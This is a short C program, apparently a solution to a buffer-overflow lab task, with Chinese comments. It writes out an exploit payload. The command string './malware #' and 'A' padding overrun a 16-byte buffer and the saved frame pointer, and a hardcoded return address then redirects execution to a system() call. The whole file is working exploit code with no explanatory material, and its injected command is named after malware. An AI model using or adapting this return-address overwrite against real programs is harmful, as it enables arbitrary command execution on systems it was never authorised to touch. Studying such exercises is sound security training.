/* Task 1: 溢出改写返回地址 -> eval 内 "mov $command_buf,%edi; call system" */
#include <stdio.h>
#include <string.h>

static void w8(unsigned long long v){ for(int i=0;i<8;i++) fputc((v>>(8*i))&0xff,stdout); }

int main(void){
    char buf[32];
    const char *cmd = "./malware #";
    size_t n = strlen(cmd);
    memcpy(buf, cmd, n);
    memset(buf + n, 'A', 24 - n);      /* 填满 expression[16] + saved rbp[8] */
    fwrite(buf, 24, 1, stdout);
    w8(0x401A6BULL);                    /* 新返回地址 */
    return 0;
}
